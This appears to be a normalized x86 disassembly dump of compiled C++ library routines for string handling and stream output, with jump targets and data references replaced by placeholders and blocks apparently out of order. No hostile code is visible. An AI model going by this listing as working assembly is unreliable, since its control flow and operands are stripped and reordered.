mov [ ebp + 0x28 ] ecx
mov [ ebp - 0x54 ] 0x0
mov ecx r--data
jne r-xdata
mov ecx [ ebp + 0x28 ]
mov edx [ ebp + 0x24 ]
push ecx
push edx
lea eax [ ebp - 0x88 ]
push eax
mov eax esi
mov esi [ ebp + 0x10 ]
call sub_4097b0
mov ecx [ eax ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x28 ] edx
mov ecx [ ebp + 0x28 ]
mov edx [ ebp + 0x24 ]
push 0x1
push ecx
mov ecx [ ebp - 0x6c ]
push edx
lea eax [ ebp - 0x88 ]
push eax
push ecx
mov eax ebx
call sub_409b80
mov edx [ eax ]
add esp 0x14
mov [ ebp + 0x24 ] edx
mov eax [ eax + 0x4 ]
inc ebx
dec edi
mov [ ebp + 0x28 ] eax
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x5c ] 0x0
add esp 0xc
mov edx [ edx + 0x14 ]
and edx 0x1c0
cmp edx 0x40
je r-xdata
mov ecx [ ebp - 0x54 ]
push 0x30
push ecx
sub edi ebx
lea esi [ ebp - 0x30 ]
call sub_408df0
mov esi [ ebp - 0x84 ]
mov eax [ ebp - 0x58 ]
push 0x30
push eax
lea ecx [ ebp - 0x30 ]
call sub_409a90
mov [ ebp - 0x58 ] esi
push 0x30
test esi esi
jne r-xdata
mov [ ebp - 0x1c ] 0xf
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
cmp [ ebp - 0x38 ] esi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_43811c
add esp 0x4
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push 0x1
push edx
push eax
mov eax [ ebp - 0x6c ]
lea edx [ ebp - 0x80 ]
push edx
push eax
mov eax ecx
call sub_409b80
mov ecx [ eax ]
add ebx edi
add esp 0x14
sub [ ebp - 0x50 ] edi
mov edi [ ebp - 0x50 ]
mov [ ebp + 0x24 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x28 ] edx
mov ecx r--data
mov ecx [ ebp - 0x78 ]
sub esi ebx
lea edi [ esi + 0x1 ]
mov [ ebp - 0x84 ] esi
push ecx
lea esi [ ebp - 0x30 ]
call sub_408df0
mov edx [ ebp - 0x58 ]
mov edi [ ebp - 0x84 ]
push 0x30
push edx
call sub_408df0
mov [ ebp - 0x78 ] 0x0
mov edx [ ebp - 0x58 ]
push edx
lea ecx [ ebp - 0x30 ]
call sub_409a90
jmp r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4c ]
push edx
call sub_43811c
add esp 0x4
cmp [ ebp - 0x1c ] eax
mov eax [ ebp - 0x30 ]
jae r-xdata
lea ebx [ ebp - 0x4c ]
mov ebx [ ebp - 0x4c ]
mov eax 0x10
mov [ ebp - 0x58 ] 0x0
cmp [ ebp - 0x38 ] eax
jae r-xdata
lea ecx [ ebp - 0x64 ]
push ecx
push eax
call sub_438ca0
mov edi eax
mov al [ ebx ]
add esp 0x8
cmp al 0x7f
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x1c ] 0x10
mov ebx [ ebp - 0x30 ]
jae r-xdata
test al al
jle r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x50 ] eax
mov edi eax
lea ebx [ ebp - 0x30 ]
mov edx edi
sub edx [ ebp - 0x68 ]
movsx eax al
cmp eax edx
jae r-xdata
push 0x0
sub edi eax
push 0x1
lea esi [ ebp - 0x30 ]
call sub_408df0
cmp [ ebx + 0x1 ] 0x0
jle r-xdata
mov al [ ebx ]
cmp al 0x7f
jne r-xdata
inc ebx
sub_4094a0
push ebp
mov ebp esp
push 0xffffffff
push sub_451280
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x14 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x30 ] edx
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_40a480
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x54 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4c ]
lea esi [ ebp - 0x2c ]
call sub_427c60
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
mov al [ ebx ]
cmp al 0x2b
je r-xdata
push 0x0
lea ecx [ ebp - 0x34 ]
mov edi eax
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x34 ] ecx
cmp al 0x2d
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x34 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
mov edi [ ebp - 0x30 ]
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov al [ ebx + 0x1 ]
cmp al 0x78
je r-xdata
xor esi esi
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x34 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x4c ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push ecx
push edx
mov edx [ ebp - 0x44 ]
push edi
lea ecx [ ebp - 0x50 ]
push ecx
movzx eax ax
push edx
mov ecx ebx
call sub_409c50
mov ecx [ eax ]
mov edx [ ebp - 0x48 ]
add esp 0x14
mov [ ebp + 0x18 ] ecx
mov eax [ eax + 0x4 ]
xor edi edi
push eax
mov [ edx + 0x20 ] edi
mov [ edx + 0x24 ] edi
mov edi [ ebp + 0xc ]
mov [ ebp + 0x1c ] eax
push ecx
mov eax esi
mov esi [ ebp + 0x10 ]
push edi
call sub_4097b0
add esp 0xc
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
cmp eax 0x100
je r-xdata
cmp esi edi
jbe r-xdata
test esi esi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
mov eax [ ebp - 0x34 ]
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push eax
push ecx
mov ecx [ ebp - 0x44 ]
push edx
lea eax [ ebp - 0x40 ]
push eax
push ecx
mov eax ebx
call sub_409b80
mov edx [ eax ]
mov [ ebp + 0x18 ] edx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x1c ] ecx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x34 ]
mov eax [ eax ]
add esp 0x14
push edx
add ebx ecx
sub edi ecx
push eax
lea ecx [ ebp - 0x38 ]
mov eax esi
mov esi [ ebp + 0x10 ]
push ecx
call sub_4097b0
mov edx [ eax ]
mov [ ebp + 0x18 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0x18 ]
push eax
push ecx
lea edx [ ebp - 0x38 ]
mov eax esi
mov esi [ ebp + 0x10 ]
push edx
call sub_4097b0
mov ecx [ eax ]
mov [ ebp + 0x18 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x1c ] edx
jmp r-xdata
sub esi edi
jmp r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x3c ] edx
jmp r-xdata
add esp 0xc
xor esi esi
mov eax [ eax + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x48 ]
cmp [ eax + 0x24 ] 0x0
mov esi [ eax + 0x20 ]
jl r-xdata
jmp r-xdata
mov edx [ ebp - 0x3c ]
mov al [ edx ]
mov edi [ ebp - 0x30 ]
mov esi edi
cmp al 0x7f
je r-xdata
test al al
jle r-xdata
mov ecx esi
sub ecx [ ebp - 0x34 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub esi eax
sub edi esi
lea eax [ edi + 0x1 ]
push eax
lea edi [ ebx + esi ]
push edi
push eax
lea edx [ ebx + esi + 0x1 ]
push edx
call sub_438b44
mov eax [ ebp - 0x3c ]
inc [ ebp - 0x30 ]
add esp 0x10
mov [ edi ] 0x0
cmp [ eax + 0x1 ] 0x0
jle r-xdata
mov al [ eax ]
cmp al 0x7f
jne r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov edi [ ebp - 0x30 ]
sub_409740
push ebp
mov ebp esp
push ebx
mov ebx eax
push edi
mov edi ecx
mov ecx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebx
pop ebp
retn
push esi
mov [ ebp + 0xc ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
movzx edx [ edi ]
je r-xdata
test ecx ecx
je r-xdata
pop esi
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
add edi 0x2
dec ebx
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea esi [ ecx + 0x2 ]
mov [ eax ] esi
mov [ ecx ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x10 ]
jne r-xdata
sub_4097b0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
push edi
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop edi
pop ebp
retn
lea ecx [ ecx ]
mov [ ebp + 0xc ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
dec edi
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov [ ecx ] si
movzx eax si
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x10 ]
jne r-xdata
sub_409860
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
mov ecx eax
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ ecx + 0x2 ]
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
mov ecx esi
call sub_401c90
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_4098c0
push ebp
mov ebp esp
push ecx
mov eax [ ecx + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
mov ecx eax
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ ecx + 0x2 ]
jmp r-xdata
mov dx [ ecx ]
add ecx 0x2
test dx dx
jne r-xdata
sub ecx edi
sar ecx 0x1
push ecx
mov ecx esi
call sub_401c90
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_409920
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
mov [ esi ] r--data
call sub_438111
mov ecx [ esi + 0x10 ]
push ecx
call sub_438111
mov edx [ esi + 0x14 ]
push edx
call sub_438111
add esp 0xc
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_409970
push ebp
mov ebp esp
push ebx
mov ebx eax
push esi
mov esi ecx
test ebx ebx
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ ebp + 0x8 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx edx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
test edx edx
je r-xdata
push r--data
call sub_435a79
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push edi
lea edi [ eax + edx ]
cmp edi 0xfffffffe
jbe r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_435a79
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_405f00
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov eax esi
sub ebx eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
call sub_409cf0
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi ]
sub ebx eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
call sub_409cf0
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x4
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push edx
mov edx [ esi + 0x10 ]
add edx eax
push ebx
push edx
call sub_43a8a0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_409a90
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_435a79
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_435a79
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_405f00
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x10 ]
push edx
push ebx
push eax
mov ecx esi
call sub_409b40
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_409b40
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
add ecx [ ebp + 0x8 ]
push eax
movsx eax [ ebp + 0x10 ]
push eax
push ecx
call sub_43a820
add esp 0xc
pop ebp
retn 0xc
mov ecx [ ecx ]
mov al [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx ] al
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_409b80
push ebp
mov ebp esp
sub esp 0x10
push esi
xor esi esi
push edi
mov edi eax
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x18 ] esi
jbe r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
pop edi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
add eax 0x8
mov [ ebp - 0xc ] eax
push ebx
mov [ ebp + 0x10 ] 0x1
mov ebx [ ecx + 0x24 ]
cmp [ ebx ] 0x0
mov esi [ ebp - 0x8 ]
lea eax [ ecx + 0x24 ]
movzx edx si
je r-xdata
mov edx [ ebp - 0xc ]
mov cl [ edi ]
push edx
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] cl
push 0x1
lea ecx [ ebp - 0x4 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x10 ] esi
call sub_43640d
mov ecx [ ebp + 0x14 ]
add esp 0x14
cmp ecx esi
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
pop ebx
pop edi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
call edx
movzx eax ax
mov ebx [ ecx + 0x34 ]
cmp [ ebx ] 0x0
jle r-xdata
mov eax [ ebp + 0x18 ]
dec eax
xor esi esi
inc edi
mov [ ebp + 0x18 ] eax
cmp eax esi
ja r-xdata
mov ecx ebx
dec [ ecx ]
mov eax [ eax ]
mov ecx [ eax ]
lea esi [ ecx + 0x2 ]
mov [ eax ] esi
mov [ ecx ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x14 ]
jne r-xdata
sub_409c50
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
mov esi eax
mov ebx ecx
lea ecx [ ecx ]
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
push edi
push eax
mov eax [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
push eax
mov eax ebx
call sub_409b80
mov ecx [ eax ]
mov [ ebp + 0x14 ] ecx
mov edx [ eax + 0x4 ]
add esp 0x14
add ebx edi
sub [ ebp + 0x10 ] edi
mov [ ebp + 0x18 ] edx
je r-xdata
sub eax ebx
mov edi eax
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn
test si si
je r-xdata
inc ebx
dec [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
lea eax [ ebp - 0x14 ]
push eax
mov eax 0x1
call sub_4097b0
mov ecx [ eax ]
mov [ ebp + 0x14 ] ecx
mov edx [ eax + 0x4 ]
add esp 0xc
mov [ ebp + 0x18 ] edx
mov edi [ ebp + 0x10 ]
push edi
push 0x0
push ebx
call sub_438bc0
add esp 0xc
test eax eax
je r-xdata
sub_409cf0
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax edx
jae r-xdata
sub eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_435ac6
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_435a79
mov eax esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_435a79
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_405f00
mov edx [ ebp + 0xc ]
test edi edi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax esi
pop edi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop ebx
pop ebp
retn 0x8
add ecx edx
mov edx [ esi + 0x10 ]
push ebx
push ecx
add edx eax
push edx
call sub_43a8a0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_409de0
push ebp
mov ebp esp
push 0xffffffff
push sub_45228a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x14 ] edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx [ edx + esi + 0x24 ]
mov eax [ edx + esi + 0x20 ]
test ecx ecx
jl r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
jg r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
jne r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax + 0x4 ]
call edx
cmp ecx edi
jl r-xdata
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
sete cl
mov [ ebp - 0x24 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + esi + 0x3c ]
test eax eax
je r-xdata
jg r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ eax + esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov edx 0x4
jmp r-xdata
mov ecx eax
call sub_403670
sub eax [ ebp - 0x18 ]
sbb ecx edi
mov ebx eax
mov [ ebp - 0x1c ] ecx
jmp r-xdata
cmp eax [ ebp - 0x18 ]
jbe r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov edx [ ebp - 0x18 ]
mov ecx [ eax + esi + 0x38 ]
mov eax [ ebp + 0xc ]
xor edi edi
push edi
push edx
push eax
call sub_40a5c0
cmp eax [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jl r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edx edx
je r-xdata
mov edx [ edx + esi + 0x38 ]
mov [ ebp - 0x28 ] esi
test edx edx
je r-xdata
mov [ ebp - 0x14 ] 0x4
cmp edx edi
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
jg r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_43d14a
mov edi [ ebp - 0x28 ]
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jl r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ecx ecx
mov [ eax + esi + 0x20 ] ecx
mov [ eax + esi + 0x24 ] ecx
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x14 ]
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
jg r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test ebx ebx
je r-xdata
add ebx 0xffffffff
adc [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
or [ ebp - 0x14 ] 0x4
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edi [ eax + 0x2 ]
mov [ ecx ] edi
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
add ebx 0xffffffff
adc [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
or [ ebp - 0x14 ] 0x4
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edi [ eax + 0x2 ]
mov [ ecx ] edi
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_40a05c
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_40a0a0
push ebp
mov ebp esp
push 0xffffffff
push sub_45224a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov edx [ eax + esi + 0x24 ]
mov ebx [ edi + 0x10 ]
mov ecx [ eax + esi + 0x20 ]
mov [ ebp - 0x14 ] 0x0
test edx edx
jl r-xdata
mov [ ebp - 0x18 ] 0x0
jg r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
call eax
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] edx
cmp ecx ebx
jbe r-xdata
test ecx ecx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
sete cl
mov [ ebp - 0x1c ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + esi + 0x3c ]
test eax eax
je r-xdata
sub ecx ebx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ eax + esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
mov ecx eax
call sub_403670
mov eax [ eax + esi + 0x38 ]
mov [ ebp - 0x20 ] esi
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
lea esp [ esp ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx esi
test edx edx
je r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
